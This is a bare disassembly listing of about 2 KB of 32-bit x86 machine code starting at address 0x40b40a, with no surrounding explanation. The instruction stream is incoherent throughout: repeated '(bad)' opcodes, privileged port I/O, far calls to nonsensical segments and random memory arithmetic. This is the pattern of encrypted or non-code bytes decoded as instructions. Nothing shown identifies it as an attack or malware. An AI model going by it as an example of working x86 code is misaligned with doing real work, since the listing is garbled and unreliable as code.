  40b40a:	ret    
  40b40b:	push   esi
  40b40c:	jg     0x40b488
  40b40e:	into   
  40b40f:	stc    
  40b410:	hlt    
  40b411:	mov    ds:0x61f274dc,eax
  40b416:	mov    bh,0x66
  40b418:	stc    
  40b419:	push   edi
  40b41a:	push   0xe468d4f7
  40b41f:	mov    eax,0x3c589214
  40b424:	or     edx,edx
  40b426:	cmc    
  40b427:	xor    DWORD PTR [ecx-0x1a],edx
  40b42a:	pusha  
  40b42b:	inc    ebp
  40b42c:	pop    esi
  40b42d:	sub    eax,0xfe2d605b
  40b432:	cmp    eax,DWORD PTR [edx-0x45b11937]
  40b438:	into   
  40b439:	pop    esi
  40b43a:	and    ebx,edx
  40b43c:	das    
  40b43d:	das    
  40b43e:	cmc    
  40b43f:	xchg   ebx,eax
  40b440:	jg     0x40b431
  40b442:	cmp    ah,bh
  40b444:	dec    ebp
  40b445:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b446:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b447:	inc    esp
  40b448:	push   ss
  40b449:	fstp   TBYTE PTR [ebx-0x2e]
  40b44c:	add    DWORD PTR [eax],ebp
  40b44e:	push   ebp
  40b44f:	mov    dh,0xf4
  40b451:	fild   QWORD PTR [ebx]
  40b453:	xor    esp,DWORD PTR [esp+eiz*2+0x10]
  40b457:	sbb    BYTE PTR ds:0x94d241f4,al
  40b45d:	jg     0x40b42c
  40b45f:	add    esi,ebx
  40b461:	jg     0x341d5c65
  40b467:	dec    edx
  40b468:	int    0x4b
  40b46a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b46b:	fsubr  QWORD PTR [edi]
  40b46d:	stc    
  40b46e:	adc    esp,DWORD PTR [edx+eiz*4+0x7f62f8a5]
  40b475:	xlat   BYTE PTR ds:[ebx]
  40b476:	pop    ss
  40b477:	push   edi
  40b478:	sbb    esp,DWORD PTR [esi-0xa]
  40b47b:	xor    edx,DWORD PTR [ebx-0x73]
  40b47e:	btc    DWORD PTR [edi],edi
  40b481:	xlat   BYTE PTR ds:[ebx]
  40b482:	(bad)  
  40b483:	icebp  
  40b484:	pop    es
  40b485:	in     al,0x23
  40b487:	outs   dx,BYTE PTR ds:[esi]
  40b488:	mov    bh,0xbd
  40b48a:	mov    edi,0x1036d10e
  40b48f:	stc    
  40b490:	ins    BYTE PTR es:[edi],dx
  40b491:	jns    0x40b47e
  40b493:	enter  0x4723,0x47
  40b497:	adc    BYTE PTR [edi],cl
  40b499:	lea    ebp,[eax-0x262926ec]
  40b49f:	fst    QWORD PTR [eax+0x4a]
  40b4a2:	ss push ecx
  40b4a4:	test   eax,0x914e8cde
  40b4a9:	pop    es
  40b4aa:	and    edi,DWORD PTR [edi-0x69df27b8]
  40b4b0:	mov    al,0x47
  40b4b2:	std    
  40b4b3:	push   ss
  40b4b4:	pop    edx
  40b4b5:	dec    ebp
  40b4b6:	cmp    DWORD PTR [ebx-0x2],ecx
  40b4b9:	sar    DWORD PTR [eax],cl
  40b4bb:	push   0xfe0752ff
  40b4c0:	nop
  40b4c1:	and    DWORD PTR [ecx-0x11],esp
  40b4c4:	js     0x40b450
  40b4c6:	out    dx,eax
  40b4c7:	fwait
  40b4c8:	cmp    dh,BYTE PTR [edx-0x28]
  40b4cb:	dec    eax
  40b4cc:	pop    ebp
  40b4cd:	push   eax
  40b4ce:	xor    eax,0x7b473602
  40b4d3:	shr    DWORD PTR [ecx-0xf4f8767],cl
  40b4d9:	lds    edx,FWORD PTR [ecx-0x4f]
  40b4dc:	cmp    BYTE PTR [esi],0x95
  40b4df:	adc    edi,ecx
  40b4e1:	pop    edx
  40b4e2:	loopne 0x40b46e
  40b4e4:	sbb    eax,0x99f878cb
  40b4e9:	addr16 jge 0x40b4b6
  40b4ec:	push   DWORD PTR [eax]
  40b4ee:	ret    
  40b4ef:	sub    ebp,DWORD PTR [edi]
  40b4f1:	mov    cl,0x1e
  40b4f3:	mov    DWORD PTR [esi+ebx*8-0x10],edx
  40b4f7:	jl     0x40b55a
  40b4f9:	dec    edx
  40b4fa:	dec    edx
  40b4fb:	inc    esp
  40b4fc:	repnz cmp dh,BYTE PTR [edi+0x6f]
  40b500:	dec    DWORD PTR [ebp+0x77]
  40b503:	lock push ebp
  40b505:	push   ebx
  40b506:	add    eax,DWORD PTR [edi-0x6ead3d97]
  40b50c:	sbb    al,dl
  40b50e:	push   ebx
  40b50f:	add    al,0x0
  40b511:	cmp    al,0x58
  40b513:	scas   al,BYTE PTR es:[edi]
  40b514:	jmp    0xa4c24a89
  40b519:	xchg   ecx,eax
  40b51a:	fisub  WORD PTR [edi+0x32]
  40b51d:	mov    ds:0xe37bfdc3,al
  40b522:	mov    bl,dl
  40b524:	mov    bh,bh
  40b526:	(bad)  
  40b527:	aaa    
  40b528:	and    DWORD PTR ds:0xd1439c4d,edi
  40b52e:	inc    ebp
  40b52f:	scas   al,BYTE PTR es:[edi]
  40b530:	pop    es
  40b531:	imul   edi,DWORD PTR [edi+0x3e],0x68
  40b535:	xor    esp,ebx
  40b537:	push   ecx
  40b538:	sar    DWORD PTR [esi-0x33],1
  40b53b:	push   0x4b
  40b53d:	imul   edx,DWORD PTR [esi-0xf],0xffffff90
  40b541:	or     edi,DWORD PTR [eax-0x1a530f7d]
  40b547:	aaa    
  40b548:	dec    esi
  40b549:	aad    0x23
  40b54b:	sub    eax,0x97ac9bf0
  40b550:	sti    
  40b551:	cmp    ah,0x8f
  40b554:	sbb    edx,DWORD PTR [esi+ebp*2]
  40b557:	dec    eax
  40b558:	cmp    eax,0xed116f10
  40b55d:	and    esp,DWORD PTR [esi+0x44f39914]
  40b563:	mov    bl,0x64
  40b565:	test   DWORD PTR [edx+0x52],0xd1288580
  40b56c:	and    eax,0x5d15d1d3
  40b571:	popa   
  40b572:	inc    esi
  40b573:	mov    bh,0x7f
  40b575:	adc    eax,0xced7303d
  40b57a:	stos   BYTE PTR es:[edi],al
  40b57b:	jo     0x40b5c1
  40b57d:	push   edx
  40b57e:	jle    0x40b515
  40b580:	(bad)  
  40b581:	imul   ebp,DWORD PTR [edi-0x12],0xdf523834
  40b588:	test   esi,ebx
  40b58a:	mov    dl,0xeb
  40b58c:	jne    0x40b5c1
  40b58e:	(bad)  ds:0x686df6ea
  40b594:	sub    al,0x31
  40b596:	retf   0x6a10
  40b599:	inc    esp
  40b59a:	fild   WORD PTR [edx]
  40b59c:	nop
  40b59d:	xchg   edi,eax
  40b59e:	cwde   
  40b59f:	out    dx,al
  40b5a0:	repz sbb ebx,DWORD PTR [eax-0x77]
  40b5a4:	retf   0x3eac
  40b5a7:	dec    esi
  40b5a8:	sub    DWORD PTR [eax-0x5930bbfd],esi
  40b5ae:	and    eax,0xc715e89d
  40b5b3:	cld    
  40b5b4:	push   edi
  40b5b5:	pop    esi
  40b5b6:	in     al,0xb4
  40b5b8:	jnp    0x40b62e
  40b5ba:	dec    ebx
  40b5bb:	popa   
  40b5bc:	or     BYTE PTR [ecx],cl
  40b5be:	sub    eax,0x2c8a9d5
  40b5c3:	adc    al,0xfd
  40b5c5:	inc    esi
  40b5c6:	rcl    DWORD PTR [eax],1
  40b5c8:	cmp    edx,DWORD PTR [edi-0x6ab59439]
  40b5ce:	scas   eax,DWORD PTR es:[edi]
  40b5cf:	retf   0x7139
  40b5d2:	lds    esp,FWORD PTR [ebp+0x38]
  40b5d5:	xchg   BYTE PTR [edi+0x4e],cl
  40b5d8:	mov    al,BYTE PTR [edx+ecx*8+0x52]
  40b5dc:	jle    0x40b58a
  40b5de:	mov    eax,db3
  40b5e1:	push   edx
  40b5e2:	cmp    al,0xe9
  40b5e4:	retf   0x42d5
  40b5e7:	push   ebp
  40b5e8:	or     DWORD PTR [ecx+0x352ee867],edx
  40b5ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b5ef:	stos   DWORD PTR es:[edi],eax
  40b5f0:	(bad)  
  40b5f1:	cld    
  40b5f2:	add    DWORD PTR [esi],esi
  40b5f4:	sbb    al,0xcf
  40b5f6:	mov    edx,0xa9d6798d
  40b5fb:	in     al,0x97
  40b5fd:	jnp    0x40b60c
  40b5ff:	rcl    BYTE PTR [esi-0x805f886],cl
  40b605:	jo     0x40b58f
  40b607:	cmp    BYTE PTR [esi+0x5d1d6c8b],0x1d
  40b60e:	add    eax,0xca9f665
  40b613:	icebp  
  40b614:	call   0x2974:0xcd92abc8
  40b61b:	arpl   WORD PTR [edx-0x69],bp
  40b61e:	push   edi
  40b61f:	popf   
  40b620:	cmp    DWORD PTR [esi+ebp*8-0x2d962008],edi
  40b627:	or     al,0x8a
  40b629:	mov    ebp,0x22de376d
  40b62e:	mov    esi,DWORD PTR [ecx]
  40b630:	xor    BYTE PTR [edi],bl
  40b632:	nop
  40b633:	clc    
  40b634:	jmp    0x3e4d5bf8
  40b639:	fisub  WORD PTR [ebp+0x76]
  40b63c:	jb     0x40b6aa
  40b63e:	out    dx,al
  40b63f:	cmp    BYTE PTR [ecx],dl
  40b641:	or     DWORD PTR [ecx-0x59],ebp
  40b644:	jns    0x40b66e
  40b646:	cmc    
  40b647:	ffreep st(4)
  40b649:	ja     0x40b656
  40b64b:	or     BYTE PTR [edx-0x35],ch
  40b64e:	jnp    0x40b647
  40b650:	push   edi
  40b651:	aas    
  40b652:	push   edx
  40b653:	ds pop edi
  40b655:	outs   dx,DWORD PTR ds:[esi]
  40b656:	lods   al,BYTE PTR fs:[esi]
  40b658:	out    dx,eax
  40b659:	(bad)  
  40b65a:	mov    edi,0x9fa0943b
  40b65f:	mov    dh,0xbf
  40b661:	sub    DWORD PTR [ebx+0x7c5b9f29],0x79
  40b668:	or     DWORD PTR [ebx+0x6],eax
  40b66b:	int3   
  40b66c:	enter  0x311d,0xae
  40b670:	sbb    eax,0x2fdbc6b7
  40b675:	add    edi,DWORD PTR [ebp+0x4fa8c324]
  40b67b:	call   0xb1b:0x27e7e51a
  40b682:	add    BYTE PTR [ebx+eiz*1+0x24],0xa5
  40b687:	mov    ch,0xe3
  40b689:	js     0x40b6cc
  40b68b:	in     al,0x9d
  40b68d:	imul   edi,DWORD PTR [ecx+0x3550ec78],0xffffffa0
  40b694:	fbstp  TBYTE PTR [esi]
  40b696:	popa   
  40b697:	sub    al,0xed
  40b699:	adc    al,0xa5
  40b69b:	and    DWORD PTR [esi+0x7e356b6d],edx
  40b6a1:	std    
  40b6a2:	popf   
  40b6a3:	(bad)  
  40b6a4:	stc    
  40b6a5:	mov    ebx,0x72afb521
  40b6aa:	bound  ebp,QWORD PTR [edx+0x64878c93]
  40b6b0:	repnz outs dx,DWORD PTR ds:[esi]
  40b6b2:	shr    BYTE PTR [esp+ebp*1+0x5c],0x99
  40b6b7:	shr    BYTE PTR [esi-0x71],0xcb
  40b6bb:	pop    ds
  40b6bc:	es mov dh,0x0
  40b6bf:	js     0x40b6ae
  40b6c1:	test   al,0xb6
  40b6c3:	inc    ebp
  40b6c4:	daa    
  40b6c5:	test   BYTE PTR [ebx-0x7363311d],dh
  40b6cb:	call   0xbd77:0xa270c0e2
  40b6d2:	out    dx,eax
  40b6d3:	cwde   
  40b6d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b6d5:	rol    edi,cl
  40b6d7:	pop    ebx
  40b6d8:	mov    eax,0x7ca51714
  40b6dd:	xchg   ecx,eax
  40b6de:	fldlg2 
  40b6e0:	and    DWORD PTR [ebx+0x15],ebx
  40b6e3:	add    DWORD PTR [edx+0x3abbfab4],edi
  40b6e9:	aad    0x82
  40b6eb:	stos   BYTE PTR es:[edi],al
  40b6ec:	dec    eax
  40b6ed:	dec    esp
  40b6ee:	loopne 0x40b6c1
  40b6f0:	mov    eax,ds:0x89c3ad89
  40b6f5:	add    ecx,ebp
  40b6f7:	xchg   DWORD PTR [ecx],ecx
  40b6f9:	add    BYTE PTR [eax],al
  40b6fb:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  40b702:	jmp    0x40c082
  40b707:	jmp    0x40ba28
  40b70c:	and    esp,esi
  40b70e:	jnp    0x40b710
  40b710:	cmp    esp,ecx
  40b712:	and    ebp,esp
  40b714:	jp     0x40b6f1
  40b716:	push   edx
  40b717:	mov    WORD PTR [edi+0x14017f2a],gs
  40b71d:	clc    
  40b71e:	jle    0x40b79e
  40b720:	jp     0x40b79f
  40b722:	jle    0x40b7a2
  40b724:	dec    eax
  40b725:	cs in  eax,dx
  40b727:	jle    0x40b6f9
  40b729:	idiv   DWORD PTR [ecx]
  40b72b:	jb     0x40b700
  40b72d:	and    DWORD PTR [ebx-0x17bda725],ecx
  40b733:	sti    
  40b734:	sub    al,0x91
  40b736:	cmp    eax,0x9be07403
  40b73b:	loopne 0x40b71b
  40b73d:	adc    ah,BYTE PTR [ebx-0x3aff88fa]
  40b743:	dec    eax
  40b744:	add    BYTE PTR [ebp+0x1],dh
  40b747:	div    BYTE PTR [ebx]
  40b749:	repnz mov bh,0x32
  40b74c:	lods   eax,DWORD PTR ds:[esi]
  40b74d:	jmp    ebx
  40b74f:	jg     0x40b708
  40b751:	dec    esi
  40b752:	jae    0x40b7d3
  40b754:	push   esi
  40b755:	sbb    ebp,0x34239f75
  40b75b:	cmp    ebx,DWORD PTR ds:[ecx]
  40b75e:	mov    ?,WORD PTR [esi-0x21]
  40b761:	sbb    ch,BYTE PTR [bx+di-0x4bd4]
  40b766:	jns    0x40b7bd
  40b768:	inc    esi
  40b769:	ins    BYTE PTR es:[edi],dx
  40b76a:	jge    0x40b779
  40b76c:	jo     0x40b7b7
  40b76e:	les    eax,FWORD PTR [edi]
  40b770:	nop
  40b771:	in     al,0xc4
  40b773:	dec    edx
  40b774:	sub    al,0x5e
  40b776:	inc    ecx
  40b777:	xchg   esi,eax
  40b778:	cdq    
  40b779:	sbb    edi,DWORD PTR [edi-0x19]
  40b77c:	mov    cl,0xae
  40b77e:	pop    edx
  40b77f:	adc    BYTE PTR [eax],cl
  40b781:	fst    QWORD PTR [ecx]
  40b783:	es xchg esi,eax
  40b785:	lock jecxz 0x40b797
  40b788:	stos   DWORD PTR es:[edi],eax
  40b789:	sbb    BYTE PTR [eax],cl
  40b78b:	mov    BYTE PTR [ecx-0x7f90f8d],ch
  40b791:	mov    WORD PTR [edx-0x4454e228],fs
  40b797:	sub    esp,ebp
  40b799:	jne    0x40b754
  40b79b:	pop    ds
  40b79c:	jae    0x40b7d2
  40b79e:	mov    dh,0x38
  40b7a0:	mov    WORD PTR [ebp+0x45],gs
  40b7a3:	js     0x40b813
  40b7a5:	adc    al,0xa9
  40b7a7:	inc    eax
  40b7a8:	mov    DWORD PTR [edi+0x7f986dbd],esp
  40b7ae:	enter  0xd87e,0x95
  40b7b2:	push   eax
  40b7b3:	rcl    DWORD PTR [edi+0x31],1
  40b7b6:	lds    edx,FWORD PTR [ecx+ebp*8]
  40b7b9:	int    0x7f
  40b7bb:	aad    0x1e
  40b7bd:	xlat   BYTE PTR ds:[ebx]
  40b7be:	dec    edx
  40b7bf:	mov    dh,0x21
  40b7c1:	jl     0x40b78b
  40b7c3:	je     0x40b75b
  40b7c5:	inc    ebp
  40b7c6:	mov    ebx,0xa3f54766
  40b7cb:	sti    
  40b7cc:	mov    eax,ds:0x12ac9fe9
  40b7d1:	fild   WORD PTR [esi+0x42]
  40b7d4:	push   ds
  40b7d5:	pop    es
  40b7d6:	mov    ecx,0x9ad06b44
  40b7db:	sub    al,dh
  40b7dd:	xor    eax,0x2ee92547
  40b7e2:	popa   
  40b7e3:	xchg   esp,eax
  40b7e4:	sbb    eax,0x4b8562d
  40b7e9:	mov    ebp,0xc3afa97a
  40b7ee:	xchg   BYTE PTR [ebx-0x5b08e2ea],dl
  40b7f4:	lods   eax,DWORD PTR ds:[esi]
  40b7f5:	adc    BYTE PTR [ecx-0x685a0f07],al
  40b7fb:	popf   
  40b7fc:	xchg   esi,eax
  40b7fd:	push   ebx
  40b7fe:	retf   
  40b7ff:	shl    BYTE PTR [esi+0x4972b2fa],1
  40b805:	push   esi
  40b806:	iret   
  40b807:	jle    0x40b887
  40b809:	mov    eax,0xb4b01d68
  40b80e:	out    0xd8,eax
  40b810:	or     BYTE PTR [edi+0x2221b8d1],ch
  40b816:	mov    ch,0x59
  40b818:	aas    
  40b819:	mov    bl,BYTE PTR [edi-0x3e]
  40b81c:	cdq    
  40b81d:	push   ds
  40b81e:	mov    esp,0x954f4fb7
  40b823:	mov    ah,0xb3
  40b825:	jge    0x40b7b6
  40b827:	mov    esi,0xa0bf8881
  40b82c:	mov    ecx,0xaeb9ce7a
  40b831:	lock lahf 
  40b833:	xchg   BYTE PTR [ecx],bl
  40b835:	cmc    
  40b836:	inc    eax
  40b837:	cmp    ecx,ebp
  40b839:	xchg   edi,eax
  40b83a:	mov    esi,0xcbd6409e
  40b83f:	rcl    DWORD PTR [esi],cl
  40b841:	(bad)  
  40b842:	pop    ebx
  40b843:	test   DWORD PTR [ebx-0x3c6606f2],eax
  40b849:	ins    DWORD PTR es:[edi],dx
  40b84a:	test   BYTE PTR [esi+0x7dbf8c0e],dh
  40b850:	xor    edi,edx
  40b852:	lea    ebp,[esi+0x2b49751e]
  40b858:	jns    0x40b829
  40b85a:	sbb    BYTE PTR [esi],0xb2
  40b85d:	cmp    eax,DWORD PTR [ebx+ebp*4+0x4c09af49]
  40b864:	jb     0x40b8e0
  40b866:	mov    ebp,0xfaad6ce6
  40b86b:	xchg   esp,eax
  40b86c:	fwait
  40b86d:	stc    
  40b86e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b86f:	int3   
  40b870:	imul   ebx,DWORD PTR [eax],0xfffffff6
  40b873:	pop    ebx
  40b874:	(bad)  
  40b875:	sbb    dh,bl
  40b877:	stos   BYTE PTR es:[edi],al
  40b878:	shr    DWORD PTR ds:0x55292833,1
  40b87e:	popa   
  40b87f:	rol    DWORD PTR [esi],cl
  40b881:	or     eax,0x2147d505
  40b886:	xchg   ebp,eax
  40b887:	mov    cs,esi
  40b889:	call   0x328a:0x25296356
  40b890:	fild   DWORD PTR [ecx+0x797854e8]
  40b896:	out    dx,al
  40b897:	(bad)  
  40b898:	and    al,0xe7
  40b89a:	inc    ebx
  40b89b:	push   eax
  40b89c:	(bad)  
  40b89d:	sti    
  40b89e:	xchg   DWORD PTR [ecx-0x4894800f],ecx
  40b8a4:	adc    bl,ch
  40b8a6:	enter  0xf31a,0x78
  40b8aa:	ss adc al,0x34
  40b8ad:	outs   dx,DWORD PTR ds:[esi]
  40b8ae:	pushf  
  40b8af:	imul   DWORD PTR [ebp-0x707ff11e]
  40b8b5:	ins    DWORD PTR es:[edi],dx
  40b8b6:	pop    edx
  40b8b7:	lds    edx,FWORD PTR [eax-0x2a]
  40b8ba:	and    al,0x96
  40b8bc:	add    dh,dh
  40b8be:	in     eax,dx
  40b8bf:	mov    edi,0x46664b02
  40b8c4:	xor    al,0x6a
  40b8c6:	scas   al,BYTE PTR es:[edi]
  40b8c7:	test   al,0x66
  40b8c9:	aas    
  40b8ca:	sti    
  40b8cb:	mov    ds:0x846f1ee6,al
  40b8d0:	inc    edi
  40b8d1:	jp     0x40b891
  40b8d3:	inc    edx
  40b8d4:	mov    al,0x53
  40b8d6:	mov    ch,0x6
  40b8d8:	clc    
  40b8d9:	mov    ebp,0xda0f457
  40b8de:	js     0x40b8f2
  40b8e0:	fdivr  st,st(1)
  40b8e2:	sub    al,0x1e
  40b8e4:	inc    esi
  40b8e5:	jmp    0x40b868
  40b8e7:	push   ebp
  40b8e8:	jge    0x40b872
  40b8ea:	and    DWORD PTR [ebx-0x36],ecx
  40b8ed:	cmp    BYTE PTR [esi-0x79],dh
  40b8f0:	and    DWORD PTR [edi-0x78],ebx
  40b8f3:	mov    bh,BYTE PTR [eax+0x19]
  40b8f6:	adc    DWORD PTR [ebx-0x2d2ce42e],0xffffff8a
  40b8fd:	push   esp
  40b8fe:	lock dec ebx
  40b900:	add    DWORD PTR [edi-0x56],0x22dfa099
  40b907:	push   edx
  40b908:	hlt    
  40b909:	lds    eax,FWORD PTR [edi-0x72dc72e8]
  40b90f:	retf   
  40b910:	inc    ebp
  40b911:	inc    ebx
  40b912:	and    eax,0xfeb4fda9
  40b917:	pusha  
  40b918:	jmp    0x40b8e8
  40b91a:	adc    cl,BYTE PTR [esi+0x4d]
  40b91d:	xor    bh,BYTE PTR [ebx+edx*8-0x4d]
  40b921:	jmp    0x54a001b0
  40b926:	or     ebp,ecx
  40b928:	jmp    0x27ff7187
  40b92d:	push   edx
  40b92e:	jns    0x40b8c4
  40b930:	mov    BYTE PTR [esp+esi*4-0x41],ch
  40b934:	jns    0x40b975
  40b936:	outs   dx,BYTE PTR ds:[esi]
  40b937:	sub    BYTE PTR [eax],ch
  40b939:	mov    ss,WORD PTR [edi-0x49]
  40b93c:	mov    ah,0x35
  40b93e:	mov    ecx,0xfba44e37
  40b943:	bound  ecx,QWORD PTR [edx-0x28d0db73]
  40b949:	pop    edx
  40b94a:	cdq    
  40b94b:	jbe    0x40b97c
  40b94d:	xchg   ebp,eax
  40b94e:	test   DWORD PTR [ebx+0x27b37f5c],ecx
  40b954:	loopne 0x40b8f7
  40b956:	out    0x40,eax
  40b958:	fild   WORD PTR [edi+0xf]
  40b95b:	dec    eax
  40b95c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b95d:	or     edi,edi
  40b95f:	sbb    DWORD PTR [esp+esi*2+0x12],edi
  40b963:	call   0xc390:0x7c98176a
  40b96a:	retf   
  40b96b:	mul    BYTE PTR [esp+eax*8+0x4ef6e6c8]
  40b972:	push   edx
  40b973:	adc    bl,BYTE PTR ds:0x85de3efd
  40b979:	lods   al,BYTE PTR ds:[esi]
  40b97a:	scas   al,BYTE PTR es:[edi]
  40b97b:	and    DWORD PTR [edx-0x75],ebx
  40b97e:	in     eax,0x39
  40b980:	and    ch,dl
  40b982:	shl    BYTE PTR [ecx],cl
  40b984:	xchg   ebp,eax
  40b985:	enter  0x9c0d,0x7a
  40b989:	lock push ebx
  40b98b:	retf   
  40b98c:	std    
  40b98d:	and    bh,0xdf
  40b990:	xor    dl,dl
  40b992:	out    dx,eax
  40b993:	aaa    
  40b994:	jae    0xa4598065
  40b99a:	push   eax
  40b99b:	arpl   WORD PTR [edx-0x4ac84233],cx
  40b9a1:	outs   dx,BYTE PTR ds:[esi]
  40b9a2:	sbb    DWORD PTR [edx-0x14],eax
  40b9a5:	pusha  
  40b9a6:	in     eax,dx
  40b9a7:	(bad)  
  40b9a8:	enter  0xfed5,0x7c
  40b9ac:	mov    esp,ebx
  40b9ae:	add    edi,DWORD PTR [edi]
  40b9b0:	or     eax,0x3acb607c
  40b9b5:	cmp    dl,bl
  40b9b7:	scas   eax,DWORD PTR es:[edi]
  40b9b8:	cmp    BYTE PTR [ebp+0x40],ah
  40b9bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b9bc:	mov    eax,0x28911214
  40b9c1:	xchg   edi,eax
  40b9c2:	repz fdiv st,st(2)
  40b9c5:	adc    DWORD PTR [eax],ebx
  40b9c7:	jbe    0x40b9f0
  40b9c9:	mov    cs,ecx
  40b9cb:	xor    esp,ebx
  40b9cd:	not    DWORD PTR [ebp-0x56]
  40b9d0:	jg     0x40b970
  40b9d2:	mov    esp,DWORD PTR [edi]
  40b9d4:	cmp    al,BYTE PTR [edi-0x65]
  40b9d7:	icebp  
  40b9d8:	jle    0x40b9db
  40b9da:	add    ecx,ebx
  40b9dc:	int3   
  40b9dd:	xor    DWORD PTR [eax-0x7cd33c44],edx
  40b9e3:	lods   eax,DWORD PTR ds:[esi]
  40b9e4:	test   DWORD PTR [esi+edi*2],esi
  40b9e7:	cdq    
  40b9e8:	jle    0x40b9ce
  40b9ea:	cwde   
  40b9eb:	jmp    0x40ba4f
  40b9ed:	push   0xffffffea
  40b9ef:	es push 0xffffff82
  40b9f2:	xor    DWORD PTR ds:0xd5557b1d,0x9f32b0bb
  40b9fc:	fsubr  DWORD PTR [ebx+edi*2+0x16d4cc6d]
  40ba03:	or     ebx,DWORD PTR [edi+0x4fa54d52]
  40ba09:	das    
  40ba0a:	mov    ch,0xcb
  40ba0c:	repnz pop ecx
  40ba0e:	mov    edx,0xf357b59c
  40ba13:	mov    bh,0x54
  40ba15:	push   esp
  40ba16:	push   es
  40ba17:	out    0xc7,eax
  40ba19:	dec    edx
  40ba1a:	cmp    DWORD PTR [esi],eax
  40ba1c:	data16 lods al,BYTE PTR ds:[esi]
  40ba1e:	ds jge 0x40ba18
  40ba21:	pusha  
  40ba22:	retf   0x6b27
  40ba25:	leave  
  40ba26:	mov    ecx,0xf8458bc4
  40ba2b:	mov    ecx,DWORD PTR [ebp-0x18]
  40ba2e:	jmp    0x40bd4f
  40ba33:	xchg   esp,eax
  40ba34:	jge    0x40ba82
  40ba36:	hlt    
  40ba37:	push   ebp
  40ba38:	jne    0x40b9ee
  40ba3a:	pop    ebp
  40ba3b:	cld    
  40ba3c:	into   
  40ba3d:	inc    edx
  40ba3e:	cmp    bh,BYTE PTR [ecx]
  40ba40:	add    DWORD PTR ds:0x7e8710e9,0x7e7d7a7e
  40ba4a:	jle    0x40ba43
  40ba4c:	jge    0x40ba16
  40ba4e:	mov    WORD PTR [edi+0x25],es
  40ba51:	xor    DWORD PTR [ebp+0x4ebc2a89],eax
  40ba57:	popf   
  40ba58:	adc    DWORD PTR [ebx-0x7f],esp
  40ba5b:	mov    al,ds:0xe9378432
  40ba60:	add    edi,0xd480212d
  40ba66:	outs   dx,BYTE PTR ds:[esi]
  40ba67:	pop    eax
  40ba68:	xchg   esi,eax
  40ba69:	mov    bl,0xb9
  40ba6b:	retf   0x8bb8
  40ba6e:	xor    ah,BYTE PTR [edx+0x36]
  40ba71:	gs mov ah,ah
  40ba74:	mov    edx,0xcf0d0896
  40ba79:	(bad)  
  40ba7a:	fsubr  DWORD PTR ds:0x21b41551
  40ba80:	outs   dx,DWORD PTR es:[si]
  40ba83:	inc    ecx
  40ba84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ba85:	adc    al,0x3c
  40ba87:	in     eax,dx
  40ba88:	fistp  QWORD PTR [edi+0x6]
  40ba8b:	inc    edi
  40ba8c:	into   
  40ba8d:	cmp    eax,0x5fe34b58
  40ba92:	mov    edi,0xbaac3b80
  40ba97:	(bad)  
  40ba98:	fisttp WORD PTR [ebx+0x58a61378]
  40ba9e:	cmc    
  40ba9f:	imul   ecx,DWORD PTR cs:[eax+0x2381352],0xa338c7f0
  40baaa:	pop    esi
  40baab:	test   ebp,ebp
  40baad:	outs   dx,BYTE PTR ds:[esi]
  40baae:	gs loop 0x40ba41
  40bab1:	mov    ecx,0x1a5c11c6
  40bab6:	ins    DWORD PTR es:[edi],dx
  40bab7:	inc    ecx
  40bab8:	cmp    cl,ah
  40baba:	cmp    dl,al
  40babc:	push   cs
  40babd:	jnp    0x40bb11
  40babf:	jp     0x40bab0
  40bac1:	mov    ebx,0xa374541b
  40bac6:	pop    edi
  40bac7:	push   0xfffffffe
  40bac9:	cmp    BYTE PTR [esi-0x3],ah
  40bacc:	jg     0x40bb01
  40bace:	fisubr DWORD PTR [edx]
  40bad0:	cwde   
  40bad1:	xor    BYTE PTR [ebx+0x67],ch
  40bad4:	mov    DWORD PTR [eax+0x14],ebx
  40bad7:	xchg   BYTE PTR [ebx],bl
  40bad9:	or     DWORD PTR [edi-0x61],0xcc82fe12
  40bae0:	cs dec ebx
  40bae2:	test   BYTE PTR ds:0xc0648e1c,bl
  40bae8:	js     0x40bafe
  40baea:	mov    ss,di
  40baed:	mov    dl,BYTE PTR [ebp+0x6d7ebd7c]
  40baf3:	adc    eax,0xf9e63c31
  40baf8:	dec    ebx
  40baf9:	ret    
  40bafa:	call   0xb55b:0xe1061fc4
  40bb01:	pop    ebp
  40bb02:	inc    edi
  40bb03:	icebp  
  40bb04:	jnp    0x40bb71
  40bb06:	ret    
  40bb07:	call   0x89a6:0xd5633d6a
  40bb0e:	or     DWORD PTR [edi+0x5b61e1a6],edx
  40bb14:	xor    DWORD PTR [edi+0x468862bd],esi
  40bb1a:	cwde   
  40bb1b:	fadd   st(0),st
  40bb1d:	push   0x64c587cd
  40bb22:	out    dx,eax
  40bb23:	dec    DWORD PTR [esi+0x54defbc4]
  40bb29:	inc    edi
  40bb2a:	xchg   ebp,eax
  40bb2b:	or     eax,0xb82ae3dd
  40bb30:	sbb    bl,0x53
  40bb33:	(bad)  [eax-0x55]
  40bb36:	ja     0x40bb10
  40bb38:	pusha  
  40bb39:	jp     0x40bb4c
  40bb3b:	mov    DWORD PTR [edx-0x4d],esi
  40bb3e:	jmp    0x634a0165
  40bb43:	push   eax
  40bb44:	(bad)  
  40bb45:	lahf   
  40bb46:	jle    0x40bb04
  40bb48:	ror    DWORD PTR [eax],cl
  40bb4a:	out    0x2c,eax
  40bb4c:	pop    esp
  40bb4d:	pop    ecx
  40bb4e:	(bad)  
  40bb4f:	push   ebp
  40bb50:	in     eax,0x59
  40bb52:	aas    
  40bb53:	setbe  ch
  40bb56:	dec    edx
  40bb57:	cmp    esi,DWORD PTR [ecx-0x3c0de32f]
  40bb5d:	outs   dx,DWORD PTR ds:[esi]
  40bb5e:	mov    esi,DWORD PTR [ebx-0x7495c999]
  40bb64:	cmp    eax,0x64bd8b54
  40bb69:	or     ecx,DWORD PTR [edi-0x67]
  40bb6c:	fld    DWORD PTR [edi+edi*8]
  40bb6f:	(bad)  [esi+0x64]
  40bb72:	inc    ebx
  40bb73:	adc    BYTE PTR [edi-0x45010a83],ah
  40bb79:	test   DWORD PTR [edi+0x1f13b899],esp
  40bb7f:	dec    ebx
  40bb80:	mov    ds:0xdf5ebf8b,al
